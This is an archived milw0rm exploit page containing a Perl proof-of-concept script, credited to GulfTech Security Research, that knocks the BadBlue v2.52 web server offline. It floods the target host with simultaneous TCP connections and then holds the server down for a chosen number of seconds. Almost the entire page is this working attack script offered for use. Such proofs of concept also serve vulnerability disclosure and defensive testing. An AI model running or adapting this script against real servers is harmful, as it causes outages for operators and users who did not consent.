<html>
<head>
<title>milw0rm productions</title>
<pre>
#!/usr/bin/perl 
############################################################## 
# BadBlue v2.52 Web Server - Multiple Connections DoS POC Code 
############################################################## 
# BadBlue Web Server can not handle many simultaneous connects 
# from the same host, and will lock up until the connects stop 
############################################################## 
# This Proof Of Concept Written By GulfTech Security Research 
############################################################## 

use Strict; 
use Socket; 
use IO::Socket; 

my $host = $ARGV[0]; 
my $port = $ARGV[1]; 
my $stop = $ARGV[2]; 
my $size = 1000; 
my $prot = getprotobyname('tcp'); 
my $slep = $ARGV[3]; 

printf(&quot;================================================ &quot;); 
printf(&quot; BadBlue v2.52 Web Server Denial Of Service POC &quot;); 
printf(&quot;================================================ &quot;); 
printf(&quot;
Making %d Connections To %s &quot;, $stop , $host); 

for ($i=1; $i&lt;$stop; $i++) 
{ 
socket($i, PF_INET, SOCK_STREAM, $prot ); 
my $dest = sockaddr_in ($port, inet_aton($host)); 
connect($i, $dest); 
} 

CheckServer($host, $i, $slep, $stop); 
KillThreads($stop); 
printf(&quot;
Exploit Attempt Unsuccesful&quot;); 
exit; 

sub CheckServer($host, $i, $slep, $stop) { 
($host, $i, $slep, $stop) = @_; 
$blank = &quot;1512&quot; x 2; 
$request = &quot;GET / HTTP/1.0&quot;.$blank; 
$remote = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, 
PeerAddr =&gt; $host, 
PeerPort =&gt; $port, 
Timeout =&gt; '10000', 
Type =&gt; SOCK_STREAM, 
); 
print $remote $request; 
unless ( &lt;$remote&gt; ) 
{ 
printf(&quot;
Host %s Has Been Successfully DoS'ed &quot;, $host); 
printf(&quot;
The Host Will Be Down For %d Seconds &quot;, $slep); 
sleep($slep); 
KillThreads($stop); 
exit; 
} 
} 

sub KillThreads($stop) { 
$stop = @_; 
printf(&quot;
Killing All active Connections&quot;); 
for ($l=1; $l&lt;$stop; $l++) { 
shutdown($l,2)|| die(&quot;Couldn't Shut Down Socket&quot;); 
$l++; 
} 
} </pre>
//downloaded from milw0rm.com
</html>


<!-- BBClone v 0.4.2 OK: counter files updated -->

<!-- BBClone 0.4.2 OK: access files updated -->
